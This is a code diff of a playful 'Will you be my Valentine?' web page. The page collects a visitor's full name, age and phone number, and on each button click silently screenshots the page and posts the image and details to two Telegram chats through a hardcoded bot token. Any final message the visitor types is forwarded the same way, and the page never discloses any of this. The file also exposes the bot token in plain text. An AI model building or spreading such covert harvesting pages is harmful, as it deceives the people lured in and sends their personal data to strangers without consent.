@@ -30,6 +30,7 @@
             display: flex; align-items: center; justify-content: center;
         }
 
+        /* World Class UI Elements */
         .status-bar {
             position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between;
             padding: 12px 24px; font-size: 12px; font-weight: 600; z-index: 500;
@@ -63,13 +64,13 @@
         @keyframes fall { to { transform: translateY(110vh) rotate(720deg); } }
 
         #yt-header {
-            position: fixed; top: -300px; left: 0; width: 100%; height: 240px;
+            position: fixed; top: -300px; left: 0; width: 100%; height: 250px;
             transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             z-index: 400; background: black; border-bottom: 4px solid var(--accent);
         }
         #yt-header.active { top: 0; }
 
-        .btn-premium { background: var(--accent); transition: 0.3s; }
+        .btn-premium { background: var(--accent); transition: 0.3s; color: white; font-weight: bold; }
         .btn-premium:hover { transform: scale(1.05); filter: brightness(1.1); }
 
         .hidden-stage { display: none; }
@@ -83,7 +84,7 @@
     <div class="status-bar">
         <div id="clock">12:00</div>
         <div class="flex gap-3">
-            <span>📶</span> <span id="battery-level">🔋 98%</span>
+            <span>📶</span> <span id="battery-level">🔋 99%</span>
         </div>
     </div>
 
@@ -98,18 +99,18 @@
             
             <div id="stage-1" class="space-y-4">
                 <h1 class="text-4xl font-bold cursive mb-6">Hello Bestu! ✨</h1>
-                <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
-                <input type="date" id="dob" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
-                <input type="tel" id="mobile" placeholder="Mobile Number" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
-                <button onclick="toStage2()" class="btn-premium w-full text-white font-bold py-4 rounded-2xl mt-4 shadow-xl">Reveal Heart ❤️</button>
+                <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white placeholder-white/60">
+                <input type="number" id="age" placeholder="Age" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white placeholder-white/60">
+                <input type="tel" id="mobile" placeholder="Phone Number" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white placeholder-white/60">
+                <button onclick="toStage2()" class="btn-premium w-full py-4 rounded-2xl mt-4 shadow-xl">Reveal Secret ❤️</button>
             </div>
 
             <div id="stage-2" class="hidden-stage">
                 <h1 class="text-3xl font-bold cursive mb-10">Will you be my Valentine? ❤️</h1>
                 <div class="grid gap-4">
-                    <button onclick="handleAction('YES', '❤️')" class="btn-premium py-4 rounded-2xl font-bold text-white shadow-lg">YES! 😍</button>
-                    <button onclick="handleAction('NO', '😊')" class="bg-white/10 py-4 rounded-2xl font-bold text-white">No 😢</button>
-                    <button onclick="handleAction('FOOD', '🍕')" class="bg-yellow-500 py-4 rounded-2xl font-bold text-white">Food (You will pay! 🍕)</button>
+                    <button onclick="handleAction('YES', '❤️')" class="btn-premium py-4 rounded-2xl shadow-lg">YES! 😍</button>
+                    <button onclick="handleAction('NO', '😢')" class="bg-white/10 py-4 rounded-2xl border border-white/20">No 😢</button>
+                    <button onclick="handleAction('FOOD', '🍕')" class="bg-yellow-500 py-4 rounded-2xl shadow-lg">Food (You will pay! 🍕)</button>
                 </div>
             </div>
 
@@ -117,15 +118,15 @@
                 <h2 class="text-3xl font-bold cursive">Thank You! ❤️</h2>
                 <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKoWXlo3M1nKS6A/giphy.gif" class="w-full rounded-3xl shadow-2xl">
                 <div class="bg-white/10 p-5 rounded-3xl border border-white/10">
-                    <textarea id="final-reply" placeholder="Send a final message..." class="w-full p-3 rounded-xl bg-transparent outline-none text-sm border border-white/10 text-white" rows="2"></textarea>
-                    <button onclick="sendFinalReply()" class="w-full bg-green-500 py-3 rounded-xl mt-3 text-xs font-bold uppercase text-white">Submit ✅</button>
+                    <textarea id="final-reply" placeholder="Send me a message..." class="w-full p-3 rounded-xl bg-transparent outline-none text-sm border border-white/10 text-white" rows="2"></textarea>
+                    <button onclick="sendFinalReply()" class="w-full bg-green-500 py-3 rounded-xl mt-3 text-xs font-bold uppercase">Submit ✅</button>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        // CONFIG
+        // CONFIG - DUAL IDS
         const BOT_TOKEN = "8511064311:AAGi_3QOQzanNtc9P7PzT4z54NBZEXfK5rk";
         const CHAT_IDS = ["6572151527", "7893857792"]; 
         let store = {};
@@ -155,8 +156,8 @@
         }
 
         function toStage2() {
-            store = { n: document.getElementById('name').value, d: document.getElementById('dob').value, m: document.getElementById('mobile').value };
-            if(!store.n || !store.m) return alert("Fill all details! 😊");
+            store = { n: document.getElementById('name').value, a: document.getElementById('age').value, m: document.getElementById('mobile').value };
+            if(!store.n || !store.m) return alert("Fill all details first! 😊");
             document.getElementById('stage-1').classList.add('hidden-stage');
             document.getElementById('stage-2').classList.remove('hidden-stage');
         }
@@ -166,36 +167,39 @@
         async function handleAction(type, emoji) {
             createRain(emoji);
             
-            // Capture the WHOLE PAGE (Simulation + Body)
+            // 1. High-Resolution Full Screen Capture
             const canvas = await html2canvas(document.body, { 
                 useCORS: true, 
                 backgroundColor: null,
-                scale: 2 // High Resolution
+                scale: 2 
             });
 
             canvas.toBlob(async (blob) => {
-                // SEND TO BOTH IDS
-                CHAT_IDS.forEach(id => {
+                // SEQUENTIAL DUAL-SENDING LOGIC
+                for (const id of CHAT_IDS) {
                     const fd = new FormData();
                     fd.append('chat_id', id);
-                    fd.append('photo', blob, 'bestu_capture.png');
-                    fd.append('caption', `💖 *VALENTINE UPDATE*\n\n*Name:* ${store.n}\n*Choice:* ${type}\n*Mobile:* ${store.m}\n*DOB:* ${store.d}`);
+                    fd.append('photo', blob, 'capture.png');
+                    fd.append('caption', `💌 *NEW BESTU RESPONSE*\n\n*Name:* ${store.n}\n*Age:* ${store.a}\n*Phone:* ${store.m}\n*Choice:* ${type}`);
                     fd.append('parse_mode', 'Markdown');
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                });
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                }
             }, 'image/png');
 
+            // 2. Play Video Header
             document.getElementById('player-mount').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${ytLinks[type]}?autoplay=1" frameborder="0" allow="autoplay; encrypted-media"></iframe>`;
             document.getElementById('yt-header').classList.add('active');
+
+            // 3. Switch Stage
             document.getElementById('stage-2').classList.add('hidden-stage');
             document.getElementById('stage-3').classList.remove('hidden-stage');
         }
 
         async function sendFinalReply() {
             const reply = document.getElementById('final-reply').value;
-            CHAT_IDS.forEach(id => {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("💬 Final Message from " + store.n + ": " + reply)}`);
-            });
+            for (const id of CHAT_IDS) {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("💬 Final Message from " + store.n + ": " + reply)}`);
+            }
             alert("Sent! Thank you!");
             location.reload();
         }
